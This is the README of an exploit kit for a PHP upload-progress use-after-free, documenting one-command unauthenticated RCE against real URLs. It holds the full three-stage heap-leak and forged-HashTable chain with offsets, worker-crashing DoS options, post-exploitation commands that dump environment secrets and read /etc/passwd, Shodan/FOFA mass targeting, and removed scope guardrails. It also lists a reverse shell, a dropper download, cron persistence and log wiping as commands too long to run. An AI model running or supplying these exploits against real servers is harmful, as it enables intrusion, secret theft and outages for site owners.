# php2shell toolkit v1.4

CVE-2026-109618（PHP `session.upload_progress` 计数器悬垂指针 UAF）
的检测、验证与利用工具集。**纯 Python 标准库实现，无第三方依赖。**

> **范围声明**：本工具只针对 CVE-2026-109618 一个漏洞。不含 SQLi / XSS / CSRF / LFI / 命令注入
> 等任何通用 Web 扫描能力（历史 `extras/legacy-webscan/` 已删除，见 §20、§26）。
>
> 仅限**已获授权**的资产测试。对未授权目标使用可能违法。

---

## 零、快速开始（推荐：一条命令）

`attack/php2shell.py` 是**一体化 CLI**：指纹 → 消费点发现 → 前置判定 → OOM 落点分级
→ 泄漏判别 → 自动三阶段利用 → proof 校验，全程无需手工参数。

```bash
# ① 只检测（会发 OOM 探针，非只读；纯只读请用 p2s_ext.py recon）
python3 attack/php2shell.py scan -u http://TARGET/ --safe

# ② 检测 + 泄漏判别（区分「真受影响」与「已修复」，含 OOM，具破坏性）
python3 attack/php2shell.py scan -u http://TARGET/ --try-leak

# ③ 全自动：检测通过则直接拿 RCE（命令 ≤14 字节）
python3 attack/php2shell.py http://TARGET/ -c 'id>/out/p1' --proof-file ./p1

# ④ 批量
printf 'http://a/\nhttp://b/\n' > targets.txt
python3 attack/php2shell.py batch -f targets.txt --safe --workers 4 -o report.json
```

**结论分级**

| 结论 | 含义 | 退出码 |
|---|---|---|
| `RCE_READY` | 泄漏探针成功 + 堆破坏可观测 + proof 已回读 → 可利用 | 0 |
| `LIKELY_RCE` | **主动 UAF 实测成立**（同一 keep-alive 连接 污染→解引用，worker 被确定性打崩）→ 可进 `exploit` | 10 |
| `PREMISES_ONLY_UNVERIFIED` | 只满足前置条件（`post_max_size > memory_limit` 且能 OOM），但主动 UAF 实测**未观测到破坏** → 不下 RCE 结论 | 15 |
| `AFFECTED_DOS_ONLY` | 能 OOM 但落点在 session 回调之前 → 仅 DoS | 20 |
| `SAFE` | 两条路径都无法 OOM → 不受影响/内存充裕 | 30 |
| `NO_SINK` | 全站无 `session_start()` 消费点 → 无利用面 | 40 |
| `DOWN` | 不可达 | 50 |

**命令长度硬限制**：`MAX_CMD = 14` 字节（PoC 结构所限）。
`id>/out/p1` = 10 字节可；`id>/out/verify` = 14 字节刚好；再长会失败。

---

## 一、文件结构

```
php2shell-toolkit/
├── README.md                     # 本文件
├── attack/
│   ├── p2s_ext.py                # ★★★ 唯一主入口：fingerprint/symbols/calibrate/blind/postex/oneclick
│   ├── php2shell.py              # 一体化 CLI（scan/exploit/auto/batch，兼容保留）
│   ├── php2shell_rce.py          # 三阶段未认证 RCE（主武器，含 parse_target）
│   ├── php2shell_attack.py       # probe/crash/verify/sweep/chain 五子命令
│   └── discover.py               # 消费点/入口发现（只读 GET）
├── poc_eness/
│   └── poc_109618.py             # ★ 公共 PoC 库（被 php2shell_rce.py 硬 import，必须同级保留）
├── gui/
│   ├── server.py                 # 批量只读评估控制台（指纹，不发载荷）
│   ├── run.sh
│   └── static/{index.html,app.js,style.css}
├── tools/
│   ├── build_profiles.py         # 生成 profiles.json（ELF/容器 → 符号偏移）
│   └── build_profiles.sh         # 自动扫描本机 php2shell* 容器
└── profiles/
    └── 127.0.0.1_8090_167.json   # 本机实测标定样例（可删）

> `extras/legacy-webscan/webscan.py`（通用 Web 扫描，与 CVE 无关）已被**彻底删除**，
> 源码工作副本与交付包内均不存在，见 §20。本工具只做 CVE-2026-109618。

**重要**：`attack/*.py` 通过 `sys.path.insert(0, ../poc_eness)` 导入 `poc_109618`。
目录结构必须保持 `attack/` 与 `poc_eness/` 同级，否则报 `ModuleNotFoundError`。

## 二、环境要求

- Python 3.8+（实测 3.14）
- 仅标准库：`socket / ssl / struct / argparse / json / time`
- 无需 pip install
- 出网可达目标 HTTP 端口（脚本走裸 socket，不经代理）

```bash
python3 --version          # 确认
python3 attack/php2shell_rce.py --help
```

---

## 三、先判前置条件（决定能不能 RCE）

**RCE 成立的充要条件：`post_max_size > memory_limit`，且能发出 > memory_limit 的「有 Content-Length」body。**

| 配置 | 可否 RCE | 原因 |
|---|---|---|
| `post_max=64M` / `memory_limit=8M` | ✅ 可以 | 大 body 流式进 rfc1867 解析，OOM 落在 session 回调**之后** |
| `post_max=8M` / `memory_limit=128M`（多数生产默认） | ❌ 仅 DoS | 大 body 被截断；能 OOM 的形态都在回调**之前**，无悬垂 |
| `post_max=8M` / `memory_limit=256M` | ❌ 仅 DoS | 同上 |

**关于「从外部无损探测 post_max_size」——本工具做不到，这里必须诚实说明。**

已实测的三种思路全部失败：

| 思路 | 为什么不行 |
|---|---|
| 发超大 CL body 看是否回 413 | mod_php 超 `post_max_size` 时**直接丢弃 body 并继续执行脚本**，不返 413；生产 `display_errors=Off` 连警告都没有 |
| 看响应体/头有无截断痕迹 | 同上，PHP 不回显，`$_POST` 变空而已，与「参数没传」不可区分 |
| 用 OOM 落点反推 | 能反推时你已经在**打**目标了（DoS 级，非无损）；且落点只体现在横幅形态，不能换算成 ini 数值 |

所以工具的策略是：**不猜 ini，按版本 + 条件3 给结论**，把 `post_max_size > memory_limit`
当作**已知风险因子**写进报告，由人工用 phpinfo / 配置文件 / 容器编排 / 云厂商默认值确认。

- `fingerprint` 只回答：版本是否落在受影响区间 + 目标是否存在 `session_start()` 消费点。
- `oneclick` 会**实际尝试**并给出三种实测结论：
  `PREMISES_ONLY`(exit 15)=版本/消费点不足；`AFFECTED_DOS_ONLY`(exit 20)=打不穿（实测就是
  `post_max_size ≤ memory_limit` 那一类）；只有真正拿到 proof 才报 `RCE_CONFIRMED`(exit 0)。
- 一句话：**「能不能 RCE」由实测答案给出，不由版本号推断。**

---

## 四、工具 1：`attack/p2s_ext.py fingerprint` —— 只读受影响判定（最安全，优先用）

`fingerprint` 只做 GET/HEAD 类被动探测，**不发 OOM 载荷、不产生任何崩溃**：

1. 取 `X-Powered-By` / 报错页 / 常见版本泄露点 → 得到 PHP 版本
2. 判定版本是否落在受影响区间（`8.2<8.2.35`、`8.3<8.3.36`、`8.4<8.4.27`、`8.5<8.5.12`）
3. 检查响应里是否出现 `Set-Cookie: PHPSESSID` 之类 → 判断是否存在 `session_start()` 消费点
4. 输出 `AFFECTED / PATCHED / UNKNOWN` + 依据

```bash
python3 attack/p2s_ext.py fingerprint -u http://127.0.0.1:8090/
```

| 参数 | 说明 |
|---|---|
| `-u/--url` | 目标 URL（含 scheme） |
| `--timeout` | 单请求超时秒数 |
| `--proxy` | http(s) / socks5 代理 |

**判读**：`AFFECTED` = 版本在区间内且拿到版本串；`UNKNOWN` = 版本没取到（需人工确认）；
`PATCHED` = 版本已修。**注意：`AFFECTED` 只代表「可能可打」，不代表一定能 RCE**——
真正的结论要 `oneclick` 实测给出（见 §三 的三种实测结论）。

> 旧版的 `probe_chunked.py` / `probe_prod_oom.py` 已从交付包移除：它们靠 chunked 无 CL
> 打 header buffer 扩容期 OOM，实测落在 **session 回调之前**（`tried to allocate 4096`），
> 只能证明「受影响/可 DoS」，无法产生悬垂指针，且对目标有 DoS 副作用。
> 需要 OOM 落点分析时请用 `oneclick`，它会在同一流程里给出落点与结论。

## 五、工具 2：`php2shell_attack.py` —— 五子命令全套

| 子命令 | 作用 | 输出关键字 |
|---|---|---|
| `probe` | 指纹 + 版本 + upload_progress 可达性 + OOM 阈值二分 | `oom_threshold_mb`、`affected` |
| `crash` | 武器化打崩 worker（同 keep-alive 连接 A 污染 → B 解引用） | `verdict=worker_killed`、`crashes=n/m` |
| `verify` | 补丁对照（判断目标是否已修） | `patch_verdict=still_vulnerable / patched_or_mitigated` |
| `sweep` | Stage-1 堆泄漏扫描 | `chunk_base`、`verdict=heap_leaked` |
| `chain` | 完整链尝试（leak → libphp base → 伪造 HashTable → `zif_system`） | `stage_reached`、`rce=bool` |

```bash
# 1) 指纹与 OOM 阈值（不破坏）
python3 attack/php2shell_attack.py probe  -u http://TARGET/index.php

# 2) 打崩 worker 取证（破坏性：会杀死 worker）
python3 attack/php2shell_attack.py crash  -u http://TARGET/index.php --rounds 3 --json

# 3) 补丁对照
python3 attack/php2shell_attack.py verify -u http://TARGET/index.php --rounds 3 --json

# 4) 堆泄漏扫描
python3 attack/php2shell_attack.py sweep  -u http://TARGET/index.php

# 5) 完整链
python3 attack/php2shell_attack.py chain  -u http://TARGET/index.php
```

常用参数：`--prime-parts`（默认 1001）/ `--prime-size`（默认 3000）/ `--huge-mb`（默认 12）/
`--ns`（扫描点）/ `--zif-offset` / `--dtor-offset` / `--htdata-offset` / `--json`。

**为什么不会误报**（内置 4 道校验）：
1. 同一条 keep-alive 连接发 A、B → 保证落同一 prefork 子进程
2. keep-alive 控制组（先发两个无害请求）→ 排除「服务端关连接」被当崩溃
3. 事后存活探针 → 崩溃后普通 GET 必须仍可用
4. 堆指针严格校验 → 必须页对齐且落在 `0x7f....` 匿名映射区

---

## 六、工具 3：`php2shell_rce.py` —— 三阶段未认证 RCE（主武器）

```
Stage-1  泄漏 chunk_base      （读 OOM 时被 POST 数据覆盖的 Set-Cookie）
Stage-2  泄漏 libphp_base     （读同一基座推出的模块基址）
Stage-3  伪造 HashTable       pDestructor = zif_system → 执行命令
```

### 6.1 全自动（推荐）

```bash
python3 attack/php2shell_rce.py \
    -u http://127.0.0.1:8090/index.php \
    -c 'id>/out/p1' \
    --proof-file /path/to/local/out/p1 \
    --rounds 30
```

- `--proof-file` 是**你本机**能读到的 proof 路径（若目标容器目录已挂载到本地）；命中即停
- 成功判据：proof 文件出现且内容为 `uid=33(www-data) ...`

### 6.2 已知地址快速验证（容器重启后 ASLR 会变）

```bash
python3 attack/php2shell_rce.py \
    -u http://127.0.0.1:8090/index.php \
    -c 'id>/out/p1' --proof-file lab/out/p1 \
    --skip-leak --chunk-base 0x7ffff4c00000 --libphp-base 0x7ffff680e000 \
    --rounds 30
```

### 6.3 参数表

| 参数 | 默认 | 说明 |
|---|---|---|
| `-u/--url` | 必填 | 目标 URL（须是**会调 `session_start()`** 的脚本）|
| `-c/--cmd` | `id>/out/p1` | 待执行命令，**≤14 字节**（PoC MAX_CMD 限制）|
| `--proof-file` | 无 | 主机侧 proof 路径，出现即判定成功 |
| `--rounds` | 30 | Stage-3 尝试轮数 |
| `--stage1-n` | 841 | Stage-1 泄漏的 part 数（按目标版本/堆布局调）|
| `--stage2-t` | 406 | Stage-2 泄漏的嵌套数组组数 |
| `--profile` | bookworm | 偏移档位 |
| `--zif-offset` | 0x465370 | `zif_system` 偏移 |
| `--dtor-offset` | 0x65eb60 | `zval_ptr_dtor` 偏移 |
| `--htdata-offset` | 0x690D8 | HashTable 数据偏移 |
| `--skip-leak` | 关 | 跳过 Stage-1/2，需配 `--chunk-base`/`--libphp-base` |
| `--chunk-base` | 自动 | 手工指定 chunk base |
| `--libphp-base` | 自动 | 手工指定 libphp base |

退出码：`0` 成功 / `1` 参数或前置失败（如 cmd 超长、Stage 泄漏失败）/ `2` 未命中。

### 6.4 目标必须满足

1. 存在**会调用 `session_start()`** 的脚本（否则 upload_progress 回调不进入）
2. `session.upload_progress.enabled = 1`（PHP 默认）
3. `post_max_size > memory_limit` 且可发大 body
4. MPM 为 **prefork**（mod_php）或等价「进程常驻 + 同 worker 复用」模型

---

## 七、偏移适配（换版本必做）

偏移是**编译产物相关**的，换 PHP 版本/Debian 发行版必须重算：

```bash
# 在目标同镜像容器内
nm -D /usr/lib/apache2/modules/libphp.so 2>/dev/null | grep -E ' (zif_system|zval_ptr_dtor)$'
# htdata 偏移：由结构体布局推出，或用 PoC 的默认值逐步试探
```

已实测（php:8.4.26-apache / Debian bookworm）：

```
zif_system     = 0x465370
zval_ptr_dtor  = 0x65eb60   （GLOBAL，非 PLT）
htdata         = 0x690D8
```

## 八、已知踩坑（务必遵守）

1. **cmd 必须 ≤14 字节**：`id>/out/p1` 可以；`id>/out/verify_8090`（18B）会直接退出
2. **Stage-3 的 f part name 必须是 `f00`/`f01`**（3 字节），写成 `f` 会堆布局错位
3. **Stage-3 污染 A 必须带 `Cookie: PHPSESSID=` + 32 个 `a`**（无引号），否则 bookworm 下 PS(id) 无效
4. **Stage-3 前必须崩脏 worker**（脚本内 `rotate()` + `sleep 1.2`），让 prefork fork 干净 worker 对齐 htdata
5. **keep-alive 是命中率关键**：同连接 A/B 才同 worker；OOM 后 Apache 会强制关连接，必须新连接重来
6. **`max_multipart_body_parts = -1` 不是无限**，语义是「编译默认 1020」；要更多 part 必须显式设大

---

## 九、实测结论（本工具在其验证靶场上的表现）

| 环境 | 配置 | 结果 |
|---|---|---|
| php:8.4.26-apache (8090) | 8M / 64M | ✅ **RCE 成功**，`/out/v8` = `uid=33(www-data) gid=33(www-data)`，54B，owner www-data |
| php:8.4.26-apache (8091) | 128M / 8M（生产默认） | ❌ Stage-1 即失败，零 proof；仅可 OOM-DoS |
| php:8.2.12 (8088) | 8M / 64M | ✅ crash 3/3（SIGSEGV），最小成本约 3MB/worker |
| php:8.2.35 (8089) | 同配置 | ✅ 补丁生效，verify 0/3 全 200 |

**因此本工具的正确定位**：
- 当作 **RCE 武器**：仅对 `post_max_size > memory_limit` 的目标有效
- 当作 **受影响指纹/版本判定器**：对所有 PHP 8.2<8.2.35 / 8.3<8.3.36 / 8.4<8.4.27 / 8.5<8.5.12 有效
- 当作 **OOM-DoS 验证器**：有效（单请求约 9M 上行）
- 「低带宽 34x 放大 DoS」：**不成立**（实测膨胀 14~34x 取决于 header 行形态，需接近 memory_limit 量级的 body）

---

## 十、合法性

本工具用于**授权范围内**的安全研究、漏洞验证与防御加固。
使用者须自行确保对目标具备书面授权。作者不对未授权使用承担责任。

---

## 十一、代理、请求头与限速（v1.1 新增）

```bash
# 经单个代理出网（企业代理 / 内网跳板 / 联动 Burp、mitmproxy 抓包）
python3 attack/php2shell.py exploit -u http://TARGET/ -c 'id>/tmp/p1' \
  --proxy http://127.0.0.1:8080

# SOCKS5（支持 user:pass 认证）
python3 attack/php2shell.py exploit -u http://TARGET/ -c 'id>/tmp/p1' \
  --proxy socks5://user:pass@127.0.0.1:1080

# 追加/覆盖请求头（可重复），便于把流量标记成你自己的测试标识
python3 attack/php2shell.py exploit -u http://TARGET/ -c 'id>/tmp/p1' \
  -H 'User-Agent: research-scanner/acme' -H 'X-Engagement: pentest-2026-01'

# 多命令之间留间隔，给目标/靶场恢复时间（避免把自己环境打挂）
python3 attack/php2shell.py exploit -u http://TARGET/ \
  -c 'id>/tmp/p1' -c 'uname>/tmp/p2' --rate 5
```

实现范围：**单个** HTTP(S) `CONNECT` 代理或 SOCKS5 代理；任意自定义请求头；命令间限速。
未实现（且不会实现）：多代理池自动轮换、出口 IP 池、User-Agent 随机伪装池、延时抖动规避、日志清除/伪造。

### 为什么「不被对方日志发现」做不到（实测证据）

这不是配置问题，而是本漏洞的利用方式决定的。下面三段来自作者本地靶场（PHP 8.4.26 + Apache）的真实日志：

```
# 1) Apache access log —— 谁来了，连 UA 一起记
127.0.0.1 - - [..] "POST / HTTP/1.1" 200 .. "-" "research-probe/1.0"
127.0.0.1 - - [..] "POST / HTTP/1.1" 500 .. "-" "php2shell-rce"

# 2) Apache error log —— 打没打成功，与 UA/代理完全无关
[Tue ..] [error] [client 127.0.0.1] zend_mm_heap corrupted
[Tue ..] [notice] child pid 1234 exit signal Segmentation fault (11), possible coredump
```

- **请求层**（UA、Cookie、源 IP）能改，但 access log 一定落一条记录；`--proxy` 只是把「你的 IP」换成「代理的 IP」，日志里依然有 `POST / HTTP/1.1` + 时间戳 + 字节数。
- **服务端层**（`Allowed memory size ... exhausted`、`zend_mm_heap corrupted`、SIGSEGV/SIGABRT、core dump、内核 dmesg）由 PHP/Apache/内核自己写，**不经过 HTTP 请求头**，客户端任何伪装都不影响。
- 本 CVE 的 RCE 前置就是让 worker OOM 崩掉，因此**必然**留下上面第 2 类痕迹。想「日志里没有记录」，等价于「不触发漏洞」。
- 反向利用：`-H` 的价值不是隐藏，而是**主动标注**——把测试流量打上 `X-Engagement: <授权单号>`，让防守方 SOC 能一眼区分「授权的红队流量」与「真实攻击」，避免被当成入侵事件处置。这也是本工具推荐用法。

### 真正合规的「不污染日志」做法

1. 在**隔离靶场/预发环境**复现（本仓库的 docker compose 就是为此准备的），生产日志里自然没有记录；
2. 生产环境只在**授权窗口 + 防守方知情**下测试，并提前递交源 IP、UA、时间窗（白名单/审计豁免）；
3. 需要验证「这类攻击会不会被检测到」时，正确做法是做**检测侧**：在 Apache error log 里对 `zend_mm_heap corrupted` / `Allowed memory size .* exhausted` / `exit signal Segmentation fault` 建告警规则，比研究怎么躲日志有价值得多。

### 11.4 本机源地址轮换 `--source-addr`（v1.1）

```bash
# 按连接轮换本机源地址（多网卡 / 多 IP 的机器；按出现顺序轮换）
python3 attack/php2shell.py exploit -u http://TARGET/ -c 'id>/tmp/p1' \
  --source-addr 127.0.0.2 --source-addr 127.0.0.3 --source-addr 127.0.0.2
```

实测行为（8090 靶场）：

| 场景 | 结果 |
|---|---|
| `--source-addr 127.0.0.2/127.0.0.3` 轮换 | 服务端记录序列 `['127.0.0.2','127.0.0.3','127.0.0.2']`，整链 RCE 仍成功 |
| `--source-addr 203.0.113.9`（非本机地址） | `OSError [Errno 99] Cannot assign requested address`，**立即报错，不静默回退直连** |

**边界说明**：本参数是 `socket.bind((src, 0))`，只能选**本机已配置的地址**。它不是匿名化手段——无法把流量伪装成第三方 IP，也无法绕过基于 IP 的封禁。真实出口 IP 切换需要网络层（多线/VPN/代理），本工具只提供「单个代理」而非「代理池轮换」。

---

## 十二、RCE 之后能做什么：14 字节能力边界（实测）

### 12.1 命令上限是结构性的，不是可调参数

伪造 HashTable 大小 `ht_size=167`，`pDestructor` 固定落在 `0x98`，命令自 `0x98` 起写且需留 NUL：

```
cap = 167 − 0x98 − 1 = 14 字节
```

`php2shell.py` 中 `CMD_CAPACITY = 14`，`cmd_capacity()` 会在执行前拒绝超限命令。

**尝试放大（`--ht-size`）实测全部失败**：

| ht_size | cap | 结果 |
|---|---|---|
| **167**（默认） | 14B | ✅ RCE 成功（`id>/out/c2` → `uid=33(www-data)`） |
| 175 | 22B | ❌ Stage-1/2 泄漏成功，**Stage-3 失败** |
| 183 | 30B | ❌ Stage-1/2 泄漏成功，**Stage-3 失败** |
| 191 | 38B | ❌ Stage-1/2 泄漏成功，`[Stage-3] htdata=0x7ffff4c690d8` 返回空 |

机制：`ht_size` 偏离 167 即改变伪造块的 Zend MM size class → 悬垂指针不再落在伪造块上 → `pDestructor=zif_system` 不被触发。泄漏阶段不依赖 ht_size 故仍成功。**回滚 167 立刻恢复成功。**

### 12.1.1 命令长度闸门：`len(cmd) >= 6`（本轮实测）

同一目标反复打同一命令，命中率在长度上存在硬闸门：

| 命令 | 字节 | 结果 |
|---|---|---|
| `ls>abc` | 6 | ✅ HIT@1（34B） |
| `id>zzz` | 6 | ✅ HIT@1（54B） |
| `env>abc` | 7 | ✅ HIT@1（1071B） |
| `id>o.txt` | 8 | ✅ HIT@1（54B） |
| `ls -la>c` | 8 | ✅ HIT@1 |
| `id>/out/ra` | 10 | ✅ HIT@1 |
| `id>o` / `id>x` | 4 | ❌ 20+ 次全 MISS，`find / -xdev` 证明文件从未创建 |
| `pwd>o` / `id>ab` / `ls>ab` | 5 | ❌ 共 13 次全 MISS |

`ht_size=167`、cmd 偏移 `0x98`、容量 14 的结构不变，故短命令失败**不是** size class 位移；是长度 <6 时该原语命中率归零的经验闸门。**操作上必须把命令写在 ≥6 字节**。

### 12.2 14 字节内的可用命令集（含完整回显通道）

关键前提：**Apache/mod_php 进程 cwd = DocumentRoot**（靶场实测 `pwd>/out/p` → `/var/www/html`），且 DocumentRoot 对 web 用户可写 → **相对路径重定向即可把输出落进 webroot，再普通 HTTP GET 取回**，不需要 `/out` 这类挂载，也不需要 18 字节的绝对路径。

```bash
# 侦察
-c 'id>zzz'          #  6B → uid=33(www-data)
-c 'ls>abc'          #  6B → 当前目录
-c 'env>abc'         #  7B → 全环境变量（真实环境常含 DB_PASSWORD / API Key）
-c 'ls -la>c'        #  8B → 详细列表（含权限/属主）
-c 'ls /out>f'       #  9B → 指定目录
-c 'cat /etc/h*>d'   # 13B → /etc/hosts

# 任意文件读取：glob 作「操作数」，重定向目标用「字面量」
-c 'cat /e*/p*>b'    # 12B
-c 'cat /etc/p*>a'   # 13B → 2219B，含 root:x:0:0:root:/root:/bin/bash
```

回读：

```bash
GET http://target/a     → HTTP 200 + /etc/passwd 内容
GET http://target/zzz   → HTTP 200 + uid=33(www-data) ...
```

**失败模式（已定位根因）**：`cat</etc/p*>a`（13B）稳定失败——输入重定向 `<` 的目标被 glob 展开成多个词，`sh` 报 `ambiguous redirect`，整条命令不执行。把 glob 移到操作数位、重定向目标写死为字面量即命中。

另一个坑：`ip a>ab`（7B）会**创建 0 字节文件**——命令确实执行了，只是容器无 `ip` 二进制。**判定命中要用 `test -e`（存在）而非 `test -s`（非空）**，否则把"执行成功但无输出"误判为"未执行"。

### 12.3 超出 14 字节、因而**不可能**执行的动作

注意：任意文件读取已在 14B 内解决（见 12.2），不在下表。

| 动作 | 最短命令 | 字节 |
|---|---|---|
| 内网探测 | `nc -zv 10.0.0.1 22` | 19 |
| 落地工具 | `wget http://a/b -O x` | 20 |
| 写 WebShell（持久化） | `echo x>/var/www/html/a.php` | 31 |
| cron 持久化 | `echo * * * * * sh>/etc/cron.d/x` | 34 |
| 清空日志 | `:>/var/log/apache2/access.log` | 30 |
| 反弹 shell | `bash -i >& /dev/tcp/1.2.3.4/9 0>&1` | 39 |

结论：**持久化 / 横向移动 / 痕迹清理在本原语上无法构造**，属漏洞利用方式的结构性上限，非实现取舍。命令参数长度受 14B 限制，无法投递完整 webshell 载荷，也无法建立长连接反弹 shell。

### 12.4 真实目标上的利用形态

```bash
# 靶场实证：相对路径写 webroot
-c 'id>o.txt'                        #  8B
GET http://target/o.txt              # → HTTP 200 + uid=33(www-data)

# 任意文件读取
-c 'cat /etc/p*>a'                   # 13B
GET http://target/a                  # → HTTP 200 + /etc/passwd (2219B)
```

成立的前置是「进程 cwd 落在可写且可被 HTTP 访问的目录」。多数真实部署中 DocumentRoot 恰好满足（apache 启动后 cwd 即 DocumentRoot）。若 cwd 不可写或不可经 HTTP 读取，则退化为「盲执行 + 打崩服务」。评级时应按此区分：**能取回数据 → critical；只能盲执行/DoS → high**。

负对照：`/etc/shadow` 为 `-rw-r----- root shadow`，www-data 不可读，`cat /etc/sh*>e` 只匹配到 `/etc/shells`（118B，`grep -c root:` = 0）。

### 12.5 附带防守侧要点

若目标 DocumentRoot 为 `1777` 且 owner 为 web 用户（本靶场实测 `/var/www/html drwxrwxrwt 1777 www-data`，`www-data` 可写），则**一旦存在任意文件写原语（上传校验缺失、LFI→写、模板注入、日志注入），持久化 WebShell 立刻成立，且完全不需要本 CVE**。此配置缺陷应优先于本 CVE 修复。

---

## 十三、资产发现与版本判定：`hunt`（Shodan / FOFA）

### 13.1 这个子命令做什么、不做什么

**做**：
1. 调用 Shodan / FOFA 的**公开检索 API**，按 PHP 版本特征收集候选资产（完全被动，不接触目标）
2. 可选地对候选各发**一次普通 GET**，读 `X-Powered-By` / `Server` / phpinfo 页面，判定真实 PHP 版本
3. 按受影响矩阵给出 `AFFECTED` / `PATCHED` / `UNKNOWN` 三档结论
4. 把 `AFFECTED` 目标导出为 URL 列表，交给 `scan` / `batch` 做后续判型

**不做**：不向检索结果发起漏洞探测、不发送 OOM 变形请求、不自动 exploit。
`hunt` 的输出是**待验证清单**，不是攻击目标队列。对其中任何 IP 执行 `scan`/`exploit` 前，授权责任在使用者。

### 13.2 受影响版本矩阵

```python
AFFECTED_MAX = {(8,2):35, (8,3):36, (8,4):27, (8,5):12}
# 8.2.x < 8.2.35 / 8.3.x < 8.3.36 / 8.4.x < 8.4.27 / 8.5.x < 8.5.12
```

判定规则：

| 实测版本 | verdict | 说明 |
|---|---|---|
| 8.2.12 | `AFFECTED` | 需 < 8.2.35 |
| 8.2.35 | `PATCHED` | 边界值算已修复 |
| 8.4.26 | `AFFECTED` | 需 < 8.4.27 |
| 8.4.27 | `PATCHED` | — |
| 7.4.33 / 8.1.20 | `UNKNOWN` | 不在矩阵内，需人工查手册 |
| 无版本串 | `UNKNOWN` | 头被裁剪或站点不暴露 |

### 13.3 Shodan 用法

```bash
export SHODAN_API_KEY=xxxxxxxx          # 或 --shodan-key
python3 attack/php2shell.py hunt --php-version 8.4.26 --pages 2 --fingerprint
```

自动生成的检索式：

```
"PHP/8.4.26"
# 不带 --php-version 时用："X-Powered-By: PHP"
```

**计费提醒**：Shodan 每页 100 条、每页消耗 **1 query credit**。`--pages 2` 就是 2 credit。免费账号通常只有极少 credit，先用 `--pages 1` 确认检索式有效。

自定义检索式：

```bash
python3 attack/php2shell.py hunt \
  --query '"X-Powered-By: PHP/8.4.26" country:CN' \
  --query '"X-Powered-By: PHP/8.3.35"'
```

### 13.4 FOFA 用法

```bash
export FOFA_KEY=xxxxxxxx                # 或 --fofa-key
python3 attack/php2shell.py hunt --fofa-key $FOFA_KEY --php-version 8.4.26 --size 200
# 部分接口版本还需要邮箱
python3 attack/php2shell.py hunt --fofa-key $FOFA_KEY --fofa-email you@example.com
```

自动生成的检索式（FOFA 语法，header/body 精确匹配）：

```
header="X-Powered-By: PHP/8.4.26"
# 不带版本时：header="X-Powered-By: PHP"
```

叠加条件（第二个参数为 FOFA 语法片段）：

```python
fofa_query('8.4.26', 'country="CN"')
# → (header="X-Powered-By: PHP/8.4.26") && (country="CN")
```

**两个引擎并行**：同时给出 `--shodan-key` 与 `--fofa-key`，结果合并去重（去重键 = `source + ip/host + port`）。

### 13.5 `--fingerprint`：唯一会接触目标的动作

```bash
python3 attack/php2shell.py hunt --from-json rows.json --fingerprint --fp-limit 50 --timeout 6
```

- 对每个候选发 **1 次普通 `GET /`**，只读响应头与前 64KB
- **不发送任何变形 payload**，不带 `multipart`，不触发 OOM
- 每个目标会在自己 access log 里留 1 条普通访问记录
- `--fp-limit` 默认 200，避免 1 万条结果把你自己出口 IP 打成黑名单
- 探测结果会覆盖 API 里的 banner 版本（以真实响应为准）

### 13.6 输出

```
SRC    IP/HOST          PORT   URL                        PHP         VERDICT   SERVER
--------------------------------------------------------------------------------------
shodan 127.0.0.1        8090   http://127.0.0.1:8090/     8.4.26      AFFECTED  Apache
shodan 127.0.0.1        8091   http://127.0.0.1:8091/     8.4.26      AFFECTED  Apache
fofa   127.0.0.1        8089   http://127.0.0.1:8089/     8.2.35      PATCHED   Apache
fofa   127.0.0.1        8088   http://127.0.0.1:8088/     8.2.12      AFFECTED  Apache
shodan 203.0.113.12     8443   https://203.0.113.12:8443/ 8.4.27      PATCHED   nginx
shodan 203.0.113.13     8080   http://203.0.113.13:8080/  ?           UNKNOWN   Apache

合计 7 条，其中 AFFECTED 4 条
```

导出与消费：

```bash
# 只把 AFFECTED 写成 URL 列表（PATCHED / UNKNOWN 不写入，避免误打）
python3 attack/php2shell.py hunt --from-json rows.json --emit-targets targets.txt

# 直接接管：判型（不发漏洞探测，只判断前置）
python3 attack/php2shell.py batch -f targets.txt --workers 4
```

实测串联结果（本机 4 靶场 + 1 个 TEST-NET 假地址）：

```
targets.txt = 8090 / 8091 / 8088 / 203.0.113.11   ← 8089(8.2.35) 已被正确排除
batch 判型    → 8088 = LIKELY_RCE
```

### 13.7 离线模式 `--from-json`

不联网、不耗 credit，直接用你保存过的 API 响应复算：

```bash
curl -s "https://api.shodan.io/shodan/host/search?key=$K&query=%22PHP/8.4.26%22" -o rows.json
python3 attack/php2shell.py hunt --from-json rows.json --fingerprint
```

支持三种响应形态：Shodan `{"matches":[...]}`、FOFA `{"results":[...]}`、以及自定义数组（含 `ip`/`port`/`host`/`server`/`data`/`header` 字段）。

### 13.8 用之前请先确认三件事

1. **API 使用条款**：Shodan/FOFA 的免费额度与商用限制不同，批量检索属于消耗型调用
2. **`--fingerprint` 是主动行为**：对 1 万个 IP 发 GET，等于你自己做了 1 万次探测，选择权在你
3. **只对你拥有或已授权的资产执行 `scan` / `exploit`**：`hunt` 帮你找到「可能受影响的资产」，不等于「可以打的资产」

---

## 十四、范围护栏（已移除）

现在代码层**不做任何地址范围判断**：`php2shell.py`、`p2s_ext.py`、`recon.py` 和 GUI 都可以直接把公网 IP 作为目标，不再需要 `--scope-file` / `--allow-public` / `--i-have-authorization`，也不会再出现 `[scope] 拒绝 …` 或由此产生的 `exit 3`。

- `--scope-file`、`--allow-public`、`--i-have-authorization` 参数已删除；旧命令里带这些参数会报参数错误。
- GUI 的「授权范围」输入框和授权勾选一并删除，粘贴目标即可开始。
- `--dry-run` 保留：只打印解析后的目标，不发请求（不再涉及范围判定）。
- Shodan 导入的「自有资产」检索限定（`net:/org:/hostname:/asn:`）保留，它约束的是检索语句而不是扫描目标。

### 14.1 责任边界

发现 ≠ 授权。移除代码护栏不等于获得授权：

- 只对你拥有或已获得**书面授权**的资产执行 `scan` / `exploit` / `oneclick`；
- OOM 型探测会打爆 worker，属于破坏性行为，不是「无害扫描」；
- 建议顺序：书面授权 → `--dry-run` 复核目标 → 只读 `recon`/`fingerprint` → 再决定是否利用。



---

## 15. 主动 UAF 实测：把「前置满足」升级为「RCE 成立」

### 15.1 为什么必须加这一步

v1.3 及更早版本把「`post_max_size > memory_limit` 且能触发 OOM」直接判为 `LIKELY_RCE`。
实测证明这条判据会产生**系统性假阳性**：已修复的 PHP 8.2.35（8089）同样满足配置前置、
同样能 OOM，但它没有悬垂指针可利用。因此 v1.4 引入两步判定：

1. **前置判定**（配置 + OOM 落点）
2. **主动 UAF 实测**：在同一条 keep-alive 连接上发 A（污染请求，命中 OOM）→ B（解引用请求），
   观察 worker 是否被确定性打崩。

只有第 2 步成立才给 `LIKELY_RCE`（退出码 10）；第 2 步没打出破坏一律降级为
